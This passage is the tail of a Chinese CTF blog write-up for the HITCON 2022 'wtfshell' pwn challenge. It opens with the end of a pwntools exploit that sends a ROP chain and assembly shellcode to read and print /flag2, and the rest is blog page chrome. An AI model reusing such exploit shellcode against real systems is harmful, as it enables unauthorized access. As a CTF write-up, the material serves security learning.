class="number">0.1</span>)</span><br><span class="line">r.send(rop)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	xor rdi, rdi;</span></span><br><span class="line"><span class="string">	push 3;</span></span><br><span class="line"><span class="string">	pop rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	push 3;</span></span><br><span class="line"><span class="string">	pop rbx;</span></span><br><span class="line"><span class="string">    push 0x100000;</span></span><br><span class="line"><span class="string">    pop rcx;</span></span><br><span class="line"><span class="string">    xor rdx, rdx;</span></span><br><span class="line"><span class="string">    push 0x127;</span></span><br><span class="line"><span class="string">    pop rax;</span></span><br><span class="line"><span class="string">	int 0x80;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	xor rdi, rdi;</span></span><br><span class="line"><span class="string">	push rsp;</span></span><br><span class="line"><span class="string">	pop rsi;</span></span><br><span class="line"><span class="string">	add rsi, 0x200;</span></span><br><span class="line"><span class="string">	push rsi;</span></span><br><span class="line"><span class="string">	pop rbx;</span></span><br><span class="line"><span class="string">	push 0x100;</span></span><br><span class="line"><span class="string">	pop rdx;</span></span><br><span class="line"><span class="string">	xor rax, rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	push 1;</span></span><br><span class="line"><span class="string">	pop rdi;</span></span><br><span class="line"><span class="string">	push 0x100;</span></span><br><span class="line"><span class="string">	push rbx;</span></span><br><span class="line"><span class="string">	push rsp;</span></span><br><span class="line"><span class="string">	pop rsi;</span></span><br><span class="line"><span class="string">	push 1;</span></span><br><span class="line"><span class="string">	pop rdx;</span></span><br><span class="line"><span class="string">	push 20;</span></span><br><span class="line"><span class="string">	pop rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;/flag2\x00\x00&#x27;</span> + shellcode)</span><br><span class="line"></span><br><span class="line">qwq(heap_base)</span><br><span class="line">qwq(libc_base)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>至此， <code>wtfshell2</code>  get</p>
<p><img data-src="https://tva3.sinaimg.cn/large/008qDYGVgy1h8ob1fnj1ij30ai031gn4.jpg" alt="3"></p>
<p>Loτυs 太🌿了🥺。</p>

      <div class="tags">
          <a href="/tags/wp/" rel="tag"><i class="ic i-tag"></i> wp</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-01-14 15:06:00" itemprop="dateModified" datetime="2023-01-14T15:06:00+08:00">2023-01-14</time>
  </span>
  <span id="2022/12/01/hitcon-wtfshell/" class="item leancloud_visitors" data-flag-title="hitcon2022-wtfshell" title="阅读次数">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">阅读次数</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">次</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="Loτυs 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="Loτυs 支付宝">
        <p>支付宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>Loτυs <i class="ic i-at"><em>@</em></i>清風微醺
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="https://www.wdqjxtmph.top/2022/12/01/hitcon-wtfshell/" title="hitcon2022-wtfshell">https://www.wdqjxtmph.top/2022/12/01/hitcon-wtfshell/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c2582bbe43e0d30e039bc4.webp" title="羊城杯pwn wp">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> CTF</span>
  <h3>羊城杯pwn wp</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63dd13114757feff3385303d.png" title="2022西湖论剑pwn部分wp">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> CTF</span>
  <h3>2022西湖论剑pwn部分wp</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.1.</span> <span class="toc-text"> 代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 程序主要逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 漏洞点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%A7%E4%BF%A1%E9%81%93"><span class="toc-number">1.1.2.1.</span> <span class="toc-text"> 侧信道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#user%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.2.2.</span> <span class="toc-text"> user 结构体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strtok-off-by-null"><span class="toc-number">1.1.2.3.</span> <span class="toc-text"> strtok-&gt;off by null</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wtfshell1"><span class="toc-number">1.2.</span> <span class="toc-text"> wtfshell1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 泄露堆地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0off-by-null"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 构造 off-by-null</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E5%A1%AB%E6%BB%A1%E7%9A%84gbuff%E5%A0%86%E5%9D%97"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 得到一个填满的 gbuff 堆块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0off-by-null-2"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 构造 off by null</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text"> 遇到的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#prev_size"><span class="toc-number">1.2.2.2.1.1.</span> <span class="toc-text"> prev_size</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#fake_size"><span class="toc-number">1.2.2.2.1.2.</span> <span class="toc-text"> fake_size</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8Doff-by-null"><span class="toc-number">1.2.2.3.</span> <span class="toc-text"> 实操 off by null</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B9%E5%BF%83%E9%A5%BC%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 夹心饼攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wtfshell1-exp"><span class="toc-number">1.2.4.</span> <span class="toc-text"> wtfshell1-exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wtfshell2"><span class="toc-number">1.3.</span> <span class="toc-text"> wtfshell2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wtrshell2-exp"><span class="toc-number">1.3.1.</span> <span class="toc-text"> wtrshell2-exp</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li class="active"><a href="/2022/12/01/hitcon-wtfshell/" rel="bookmark" title="hitcon2022-wtfshell">hitcon2022-wtfshell</a></li><li><a href="/2023/03/31/%E4%BB%8Eciscn2022%E4%B8%80%E9%81%93%E4%B8%80%E8%A7%A3%E9%A2%98%E6%B5%85%E6%9E%90msg_msg%E7%BB%93%E6%9E%84%E4%BD%93/" rel="bookmark" title="从ciscn2022一道一解题浅析msg_msg结构体">从ciscn2022一道一解题浅析msg_msg结构体</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="Loτυs"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">Loτυs</p>
  <div class="description" itemprop="description">凌恒山其若陋兮、</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">23</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">7</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="/default/" rel="section"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2022/07/15/DSCTF%E9%83%A8%E5%88%86wp/" title="DSCTF pwn 部分wp">DSCTF pwn 部分wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" title="Tcachebin 总结">Tcachebin 总结</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
</div>

    <span><a href="/2021/10/30/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-UAF/" title="堆学习-UAF">堆学习-UAF</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2022/04/06/wustctf2020_babyfmt/" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" title="电科新生赛">电科新生赛</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%9A%8F%E8%AE%B0/" title="分类于 随记">随记</a>
</div>

    <span><a href="/2024/01/01/2024/" title="2023年度总结">2023年度总结</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
</div>

    <span><a href="/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/" title="堆学习-Chunk Overlapping">堆学习-Chunk Overlapping</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Loτυs @ Loτυs</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/12/01/hitcon-wtfshell/',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
